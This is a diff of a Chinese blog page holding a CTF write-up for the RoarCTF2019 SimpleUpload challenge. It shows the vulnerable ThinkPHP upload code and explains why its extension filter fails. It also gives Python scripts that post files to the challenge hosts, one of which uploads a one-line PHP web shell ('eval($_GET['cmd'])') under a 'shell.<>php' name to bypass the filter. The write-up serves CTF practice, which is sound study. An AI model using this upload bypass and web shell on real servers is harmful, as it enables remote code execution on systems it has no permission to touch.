@@ -76,7 +76,7 @@ zty153’s_blog = 网安 = web学习</title>
       <i class="ic i-pen"></i>
     </span>
     <span class="text">Symbols count in article</span>
-    <span>1.8k</span>
+    <span>1.7k</span>
     <span class="text">words</span>
   </span>
   <span class="item" title="Reading time">
@@ -117,12 +117,12 @@ zty153’s_blog = 网安 = web学习</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?315034"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?102364"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?846604"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?812149"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?747711"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?297111"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?779365"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?743332"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?185526"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?631550"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?825867"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?660217"></li>
         </ul>
       </div>
     </header>
@@ -171,75 +171,16 @@ zty153’s_blog = 网安 = web学习</title>
     <h2 id="roarctf2019simpleupload"><a class="anchor" href="#roarctf2019simpleupload">#</a> [RoarCTF2019]SimpleUpload</h2>
 <p>推荐链接：<span class="exturl" data-url="aHR0cHM6Ly9pbmFuYi5naXRodWIuaW8vMjAyMS8wOS8xNS9Sb2FyQ1RGLTIwMTktU2ltcGxlLVVwbG9hZC8=">https://inanb.github.io/2021/09/15/RoarCTF-2019-Simple-Upload/</span></p>
 <p>源码：</p>
-<pre><code> &lt;?php
-namespace Home\Controller;
-
-use Think\Controller;
-
-class IndexController extends Controller
-&#123;
-    public function index()
-    &#123;
-        show_source(__FILE__);
-    &#125;
-    public function upload()
-    &#123;
-        $uploadFile = $_FILES['file'] ;
-        
-        if (strstr(strtolower($uploadFile['name']), &quot;.php&quot;) ) &#123;
-            return false;
-        &#125;
-        
-        $upload = new \Think\Upload();// 实例化上传类
-        $upload-&gt;maxSize  = 4096 ;// 设置附件上传大小
-        $upload-&gt;allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
-        $upload-&gt;rootPath = './Public/Uploads/';// 设置附件上传目录
-        $upload-&gt;savePath = '';// 设置附件上传子目录
-        $info = $upload-&gt;upload() ;
-        if(!$info) &#123;// 上传错误提示错误信息
-          $this-&gt;error($upload-&gt;getError());
-          return;
-        &#125;else&#123;// 上传成功 获取上传文件信息
-          $url = __ROOT__.substr($upload-&gt;rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
-          echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1));
-        &#125;
-    &#125;
-&#125; 
-</code></pre>
-<p>知识点：</p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token variable">$uploadFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        </pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploadFile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        </pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Think<span class="token punctuation">\</span>Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 实例化上传类</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">maxSize</span>  <span class="token operator">=</span> <span class="token number">4096</span> <span class="token punctuation">;</span><span class="token comment">// 设置附件上传大小</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">allowExts</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传类型</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">rootPath</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./Public/Uploads/'</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传目录</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">savePath</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传子目录</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 上传错误提示错误信息</span></pre></td></tr><tr><td data-num="27"></td><td><pre>          <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>          <span class="token keyword">return</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">// 上传成功 获取上传文件信息</span></pre></td></tr><tr><td data-num="30"></td><td><pre>          <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token constant">__ROOT__</span><span class="token operator">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">rootPath</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'savepath'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'savename'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>          <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"url"</span><span class="token operator">=></span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"success"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">&#125;</span></span></pre></td></tr></table></figure><p>知识点：</p>
 <p>tp 默认上传目录：index.php/home/index/upload</p>
 <p>tp 支持多个文件上传</p>
 <p>tp 的文件上传用法这里不对，限定后缀应为 $upload-&gt;exts，所以文件名过滤无效</p>
 <p>tp 上传默认命名方式受时间戳控制，所以时间间隔很短的上传文件名会大致一样</p>
 <p>解题方法：</p>
 <p>题目中会打印出来上传成功的不以.php 结尾的文件名，通过同时上传多个文件的方法拿到 php 两侧文件的文件名，然后根据不一样的位数爆破 php 文件名</p>
-<pre><code>import requests
-#from io import BytesIO
-
-url=&quot;http://cf4a0675-7522-4210-bbdf-0492504324b3.node4.buuoj.cn:81/index.php/home/index/upload&quot;
-
-files1 = &#123;'file': open('1.txt','r')&#125;
-files2 = &#123;'file[]': open('1.php','r')&#125;
-
-r = requests.post(url,files=files1)
-print(r.text)
-
-r = requests.post(url,files=files2)
-print(r.text)
-
-r = requests.post(url,files=files1)
-print(r.text)
-</code></pre>
-<p>其他方法：直接上传 xxx.&lt;&gt;php 即可直接拿到文件名</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#from io import BytesIO</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>url<span class="token operator">=</span><span class="token string">"http://cf4a0675-7522-4210-bbdf-0492504324b3.node4.buuoj.cn:81/index.php/home/index/upload"</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>files1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>files2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file[]'</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure><p>其他方法：直接上传 xxx.&lt;&gt;php 即可直接拿到文件名</p>
 <p>其他方法：</p>
-<pre><code>import requests
-url = &quot;http://83a80334-cdce-4f32-af7b-18f7d54b565f.node5.buuoj.cn:81/index.php/home/index/upload/&quot;
-s = requests.Session()
-files = &#123;&quot;file&quot;: (&quot;shell.&lt;&gt;php&quot;, &quot;&lt;?php eval($_GET['cmd'])?&gt;&quot;)&#125;
-r = requests.post(url, files=files)
-print(r.text)
-</code></pre>
-
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://83a80334-cdce-4f32-af7b-18f7d54b565f.node5.buuoj.cn:81/index.php/home/index/upload/"</span></pre></td></tr><tr><td data-num="3"></td><td><pre>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">"shell.&lt;>php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php eval($_GET['cmd'])?>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure>
       <div class="tags">
           <a href="/tags/buuctf/" rel="tag"><i class="ic i-tag"></i> buuctf</a>
           <a href="/tags/thinkphp3-2-4/" rel="tag"><i class="ic i-tag"></i> thinkphp3.2.4</a>
@@ -254,7 +195,7 @@ print(r.text)
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2024-09-22 22:06:13" itemprop="dateModified" datetime="2024-09-22T22:06:13+08:00">2024-09-22</time>
+    <time title="Modified: 2025-10-10 10:37:37" itemprop="dateModified" datetime="2025-10-10T10:37:37+08:00">2025-10-10</time>
   </span>
   <span id="2024/09/22/RoarCTF2019-SimpleUpload/" class="item leancloud_visitors" data-flag-title="[RoarCTF2019]SimpleUpload" title="Views">
       <span class="icon">
@@ -317,7 +258,7 @@ print(r.text)
     <div class="item left">
       
 
-  <a href="/2024/09/22/NPUCTF2020-ezlogin/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?586894" title="[NPUCTF2020]ezlogin">
+  <a href="/2024/09/22/NPUCTF2020-ezlogin/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?976690" title="[NPUCTF2020]ezlogin">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
   <h3>[NPUCTF2020]ezlogin</h3>
@@ -327,7 +268,7 @@ print(r.text)
     <div class="item right">
       
 
-  <a href="/2024/09/22/GWCTF2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?559772" title="[GWCTF2019]你的名字">
+  <a href="/2024/09/22/GWCTF2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?674936" title="[GWCTF2019]你的名字">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
   <h3>[GWCTF2019]你的名字</h3>
@@ -434,7 +375,7 @@ print(r.text)
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/06/18/2021-easycms/" title="GKCTF 2021：easycms">GKCTF 2021：easycms</a></span>
+    <span><a href="/2024/11/18/BSidesCF-2019-Mixer/" title="[BSidesCF-2019]Mixer">[BSidesCF-2019]Mixer</a></span>
   </li>
 
       
@@ -444,7 +385,7 @@ print(r.text)
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2025/02/23/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-SimpleRCE/" title="[Dest0g3_520迎新赛]SimpleRCE">[Dest0g3_520迎新赛]SimpleRCE</a></span>
+    <span><a href="/2024/12/10/De1CTF-2019-Giftbox/" title="[De1CTF_2019]Giftbox">[De1CTF_2019]Giftbox</a></span>
   </li>
 
       
@@ -454,7 +395,19 @@ print(r.text)
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2025/02/23/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93Include/" title="NewStarCTF_2023_公开赛道Include">NewStarCTF_2023_公开赛道Include</a></span>
+    <span><a href="/2024/11/04/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-PackageManager2021/" title="[2021祥云杯]PackageManager2021">[2021祥云杯]PackageManager2021</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/ciscn2024/" title="In ciscn2024">ciscn2024</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/ciscn2024/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2025/05/14/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="python原型链污染">python原型链污染</a></span>
   </li>
 
       
@@ -464,7 +417,16 @@ print(r.text)
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/06/06/%5BNCTF2019%5DSQLi/" title="&#39;[NCTF2019]SQLi&#39;">'[NCTF2019]SQLi'</a></span>
+    <span><a href="/2024/09/22/NPUCTF2020-ezlogin/" title="[NPUCTF2020]ezlogin">[NPUCTF2020]ezlogin</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/05/29/ctf%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/" title="&#39;ctf工具总结&#39;">'ctf工具总结'</a></span>
   </li>
 
       
@@ -474,16 +436,7 @@ print(r.text)
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/04/28/4-txt/" title="buuctf4月28日">buuctf4月28日</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2025/07/25/nepctf2025/" title="nepctf2025">nepctf2025</a></span>
+    <span><a href="/2024/11/17/HCTF2018-Hideandseek/" title="HCTF2018Hideandseek">HCTF2018Hideandseek</a></span>
   </li>
 
       
@@ -493,16 +446,7 @@ print(r.text)
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/08/09/GYCTF2020-Ez-Express/" title="[GYCTF2020]Ez_Express">[GYCTF2020]Ez_Express</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2025/03/02/PWNHUB%E5%85%AC%E5%BC%80%E8%B5%9B2018-%E5%82%BBfufu-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%97%A5/" title="[PWNHUB公开赛2018]傻fufu_的工作日">[PWNHUB公开赛2018]傻fufu_的工作日</a></span>
+    <span><a href="/2024/09/24/virink-2019-files-share/" title="virink_2019_files_share">virink_2019_files_share</a></span>
   </li>
 
       
@@ -512,17 +456,17 @@ print(r.text)
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/12/04/MRCTF2020-Ezpop-Revenge/" title="[MRCTF2020]Ezpop_Revenge">[MRCTF2020]Ezpop_Revenge</a></span>
+    <span><a href="/2025/02/24/SWPUCTF-2016-Web7/" title="[SWPUCTF_2016]Web7">[SWPUCTF_2016]Web7</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="In 比赛复现">比赛复现</a>
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/10/27/SHctf%E5%A4%8D%E7%8E%B02024/" title="SHctf-2024部分复现">SHctf-2024部分复现</a></span>
+    <span><a href="/2024/11/05/HFCTF2021Quals-Unsetme/" title="[HFCTF2021Quals]Unsetme">[HFCTF2021Quals]Unsetme</a></span>
   </li>
 
   </ul>
@@ -547,13 +491,13 @@ print(r.text)
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="Symbols count total">683k words</span>
+    <span title="Symbols count total">697k words</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="Reading time total">10:21</span>
+    <span title="Reading time total">10:34</span>
   </div>
   <div class="powered-by">
     Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
